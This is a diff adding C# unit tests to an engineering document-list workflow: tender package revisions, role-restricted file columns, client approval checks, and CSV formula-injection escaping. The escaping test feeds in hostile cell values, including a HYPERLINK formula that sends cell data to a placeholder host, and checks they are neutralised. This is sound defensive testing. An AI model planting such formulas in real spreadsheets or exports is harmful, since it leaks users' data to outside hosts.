@@ -920,5 +920,91 @@ namespace MsTests
             Assert.AreEqual((int)EnProjectMdlStatus.Checked, Ok(await MdlView(host, Mgr1, c.Id)).Mdl.Status);
             Assert.AreEqual((int)EnProjectMdlStatus.Draft, Ok(await MdlAct(host, Mgr1, "return", d => { d.Id = v.Mdl.Id; d.Reason = "ردیف نقشه باید دوباره دیده شود"; d.RowVersion = v.Mdl.RowVersion; })).Mdl.Status);
         }
+
+        // ------------------------------------------------------------------------------------------ fix round: the package, the files, the CSV
+
+        [TestMethod]
+        public async Task After_A_Revalidation_The_Older_Mdl_Document_Leaves_The_Package_And_It_Ends_With_Exactly_One()
+        {
+            AppHost host = Started("pm_one_doc");
+            EnCaseDto c = await Releasable(host);
+            EnProjectMdlCaseDto r1 = await ApprovedMdl(host, c.Id);
+            Ok(await CaseAct(host, Mgr1, c.Id, "release-tender"));
+            Ok(await host.As(Mgr2, p => p.GetRequiredService<IEdmsService>().SaveTenderDocumentAsync(new PcTenderDocumentSaveDto { PackageId = c.TenderPackageId.Value, Title = "ملحق فنی", DocumentType = "TENDER" }, Ct)));
+            Ok(await CaseAct(host, Eng1, c.Id, "revalidate-tender"));
+            Ok(await MdlAct(host, Mgr1, "void", d => { d.Id = r1.Mdl.Id; d.Reason = "بستهٔ فنی تغییر کرد؛ فهرست دوباره تهیه شود"; d.RowVersion = r1.Mdl.RowVersion; }));
+            EnProjectMdlCaseDto r2 = await ApprovedMdl(host, c.Id);
+            Assert.AreEqual(2, r2.Mdl.Revision);
+            Assert.AreEqual((int)EnCaseStatus.TenderIssued, Ok(await CaseAct(host, Mgr1, c.Id, "release-tender")).Status);
+            var mdlDocs = host.Read(u => u.Set<PcTenderDocument>().Where(d => d.PackageId == c.TenderPackageId.Value && !d.Deleted && d.DocumentType == "MDL").Select(d => d.DocumentId).ToList());
+            Assert.AreEqual(1, mdlDocs.Count, "exactly one MDL document in the package");
+            Assert.AreEqual(r2.Mdl.IssuedDocumentId, mdlDocs[0]);
+            // the older document is taken out through the EDMS void (kept with its reason, never physically deleted)
+            Assert.AreEqual(1, host.Read(u => u.Set<PcTenderDocument>().Count(d => d.PackageId == c.TenderPackageId.Value && d.Deleted && d.DocumentId == r1.Mdl.IssuedDocumentId && d.VoidReason != null)));
+        }
+
+        [TestMethod]
+        public async Task The_Csv_Neutralises_Formula_Cells_And_The_Reader_Restores_Them_So_Download_And_Upload_Round_Trip()
+        {
+            Assert.AreEqual("'=1+1", EnReferenceCsv.Neutralise("=1+1"));
+            Assert.AreEqual("'+cmd", EnReferenceCsv.Neutralise("+cmd"));
+            Assert.AreEqual("'-5", EnReferenceCsv.Neutralise("-5"));
+            Assert.AreEqual("'@SUM(A1)", EnReferenceCsv.Neutralise("@SUM(A1)"));
+            Assert.AreEqual("'\tx", EnReferenceCsv.Neutralise("\tx"));
+            Assert.AreEqual("'\rx", EnReferenceCsv.Neutralise("\rx"));
+            Assert.AreEqual("''=x", EnReferenceCsv.Neutralise("'=x"), "a text that starts with an apostrophe and a formula sign stays unambiguous");
+            Assert.AreEqual("abc", EnReferenceCsv.Neutralise("abc"));
+            Assert.AreEqual("'abc", EnReferenceCsv.Neutralise("'abc"));
+            Assert.AreEqual("=1+1", EnReferenceCsv.Plain("'=1+1"));
+            Assert.AreEqual("'abc", EnReferenceCsv.Plain("'abc"), "an apostrophe before an ordinary letter is kept");
+            Assert.AreEqual("'=x", EnReferenceCsv.Plain("''=x"));
+            AppHost host = Started("pm_csv_formula");
+            EnCaseDto c = await NewCase(host);
+            EnProjectMdlCaseDto v = await Draft(host, c.Id);
+            v = Ok(await MdlUpload(host, Eng1, v.Mdl, Head + "BOM,=HYPERLINK(\"http://x/?\"&A1),=مکانیک,1,1,,0,@clause,+note\n" + "DWG,-5 درجه,مکانیک,1,1,,0,,\n" + "OPC,@SUM(A1),مکانیک,1,1,,0,,\n"));
+            Assert.AreEqual("=HYPERLINK(\"http://x/?\"&A1)", v.Mdl.Lines.First(l => !l.Removed).Title);
+            v = Ok(await MdlAct(host, Eng2, "check", d => { d.Id = v.Mdl.Id; d.RowVersion = v.Mdl.RowVersion; }));
+            v = Ok(await MdlAct(host, Mgr1, "approve", d => { d.Id = v.Mdl.Id; d.RowVersion = v.Mdl.RowVersion; }));
+            string issued = System.Text.Encoding.UTF8.GetString(await StoredAsync(host, v.Mdl.IssuedDocumentId.Value));
+            StringAssert.Contains(issued, "'=HYPERLINK");
+            StringAssert.Contains(issued, "'-5 درجه");
+            StringAssert.Contains(issued, "'@SUM(A1)");
+            // the issued file read back gives the original text
+            Assert.IsNull(EnReferenceCsv.Parse(await StoredAsync(host, v.Mdl.IssuedDocumentId.Value), out var lines, out _));
+            CollectionAssert.AreEqual(new[] { "=HYPERLINK(\"http://x/?\"&A1)", "-5 درجه", "@SUM(A1)" }, lines.Select(l => l.Title).ToArray());
+            Assert.AreEqual("=مکانیک", lines[0].Discipline);
+            Assert.AreEqual("@clause", lines[0].StandardClause);
+            Assert.AreEqual("+note", lines[0].Note);
+            // the download of the same revision is the same text
+            var dl = Ok(await host.As(Eng1, p => p.GetRequiredService<IEnProjectMdlService>().GetCsvAsync(v.Mdl.Id, Ct)));
+            Assert.AreEqual(issued.TrimStart('\uFEFF'), System.Text.Encoding.UTF8.GetString(dl.Content).TrimStart('\uFEFF'));
+        }
+
+        [TestMethod]
+        public void The_Three_Mdl_File_Columns_Are_Read_Only_By_The_Roles_That_Read_The_Mdl_Api()
+        {
+            Assert.IsTrue(Services.NasbNiro.Files.FileOwners.TryRoles("EnProjectMdl", "IssuedDocumentId", out string roles));
+            Assert.AreEqual(EnRoles.MdlReaders, roles);
+            Assert.IsTrue(Services.NasbNiro.Files.FileOwners.TryRoles("EnProjectMdl", "ClientApprovalDocumentId", out roles));
+            Assert.AreEqual(EnRoles.MdlReaders, roles);
+            Assert.IsTrue(Services.NasbNiro.Files.FileOwners.TryRoles("EnProjectMdl", "SourceDocumentId", out roles));
+            Assert.AreEqual(9, roles.Split(',').Length);
+            foreach (string wide in new[] { "QA", "QC", "WAREHOUSE", "WHSUPERVISOR", "PRODUCTIONMANAGER", "SHOPSUPERVISOR", "CONSTRUCTION", "PLANNING" })
+                CollectionAssert.DoesNotContain(roles.Split(','), wide);
+        }
+
+        [TestMethod]
+        public async Task The_Client_Approval_Needs_A_Released_Package_Not_Just_A_Later_Status()
+        {
+            AppHost host = Started("pm_client_released");
+            EnCaseDto c = await Releasable(host);
+            await ApprovedMdl(host, c.Id);
+            Ok(await CaseAct(host, Mgr1, c.Id, "release-tender"));
+            Assert.IsTrue(Ok(await MdlView(host, Comm1, c.Id)).CanRecordClientApproval);
+            host.Write(u => { u.Set<EnCase>().Single(k => k.Id == c.Id).TenderReleasedAt = null; u.SaveChanges(); }, Seeder);
+            EnProjectMdlCaseDto v = Ok(await MdlView(host, Comm1, c.Id));
+            Assert.IsFalse(v.CanRecordClientApproval);
+            Refused(await MdlAct(host, Comm1, "record-client-approval", d => { d.Id = v.Mdl.Id; d.LetterRef = "نامهٔ ۱"; d.DocumentId = File(host, 2132); }), "منتشر نشده");
+        }
     }
 }
